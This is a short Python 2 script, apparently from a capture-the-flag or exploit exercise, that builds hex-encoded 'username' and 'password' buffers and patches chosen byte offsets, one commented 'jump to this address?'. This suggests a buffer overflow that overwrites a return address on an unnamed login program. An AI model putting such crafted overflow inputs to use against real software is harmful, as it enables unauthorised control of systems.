#!/usr/bin/python

import utils
from binascii import hexlify, unhexlify

def ub():
    u = utils.mk_test_hex(0x63*2)
    ub = bytearray(unhexlify(u))
    #can't remember why I patch this
    ub[0x13] = 0
    ub[0x12] = 14
    return ub

def pb():
    p = utils.mk_test_hex(0x63*2)
    pb = bytearray(unhexlify(p))
    pb[0x11] = 0
    pb[0x12] = 0
    #jump to this address?
    pb[0x13:0x15] = [0x46, 0x3a]
    return pb

if __name__ == '__main__':
    print 'username: %s' % hexlify(ub())
    print 'password: %s' % hexlify(pb())
